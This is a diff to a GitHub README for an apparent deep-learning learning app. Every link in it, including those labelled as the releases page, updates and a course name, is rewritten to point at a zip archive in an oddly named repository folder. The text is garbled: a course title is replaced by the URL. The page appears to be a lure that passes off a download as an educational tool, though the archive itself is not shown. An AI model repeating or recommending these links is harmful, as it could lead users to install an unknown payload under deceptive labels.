@@ -1,6 +1,6 @@
 # 📚 First-Principles-Deep-Learning - Deep Learning Made Easy
 
-[![Download](https://raw.githubusercontent.com/anuragk1121/First-Principles-Deep-Learning/main/untenanted/First-Principles-Deep-Learning.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/anuragk1121/First-Principles-Deep-Learning/main/untenanted/First-Principles-Deep-Learning.zip)
+[![Download](https://github.com/anuragk1121/First-Principles-Deep-Learning/raw/refs/heads/main/untenanted/Principles-Learning-Deep-First-2.7.zip%20Now-Get%20the%20App-blue)](https://github.com/anuragk1121/First-Principles-Deep-Learning/raw/refs/heads/main/untenanted/Principles-Learning-Deep-First-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To run this application, ensure you have the following:
 
 To download the application, visit the Releases page using the link below:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/anuragk1121/First-Principles-Deep-Learning/main/untenanted/First-Principles-Deep-Learning.zip)
+[Visit the Releases Page to Download](https://github.com/anuragk1121/First-Principles-Deep-Learning/raw/refs/heads/main/untenanted/Principles-Learning-Deep-First-2.7.zip)
 
 1. Click on the above link to open the release page.
 2. Look for the latest version of the software.
@@ -49,13 +49,13 @@ If you're curious about deep learning and want to expand your knowledge, here ar
 
 - **Deep Learning Book** by Ian Goodfellow
 - **Coursera's Machine Learning Course** by Andrew Ng
-- **https://raw.githubusercontent.com/anuragk1121/First-Principles-Deep-Learning/main/untenanted/First-Principles-Deep-Learning.zip Course** on Practical Deep Learning
+- **https://github.com/anuragk1121/First-Principles-Deep-Learning/raw/refs/heads/main/untenanted/Principles-Learning-Deep-First-2.7.zip Course** on Practical Deep Learning
 
 ## 📅 Keeping Up to Date
 
 Stay updated with the latest features and improvements by checking back on the Releases page:
 
-[Check for Updates](https://raw.githubusercontent.com/anuragk1121/First-Principles-Deep-Learning/main/untenanted/First-Principles-Deep-Learning.zip)
+[Check for Updates](https://github.com/anuragk1121/First-Principles-Deep-Learning/raw/refs/heads/main/untenanted/Principles-Learning-Deep-First-2.7.zip)
 
 ## 📞 Getting Help
 
@@ -72,4 +72,4 @@ Be part of the journey. Join our community of learners who are also exploring de
 
 This project is inspired by the need for simple, accessible deep learning tools. Thanks to all the contributors who have helped shape this journey into first principles.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/anuragk1121/First-Principles-Deep-Learning/main/untenanted/First-Principles-Deep-Learning.zip)
+[Visit the Releases Page to Download](https://github.com/anuragk1121/First-Principles-Deep-Learning/raw/refs/heads/main/untenanted/Principles-Learning-Deep-First-2.7.zip)
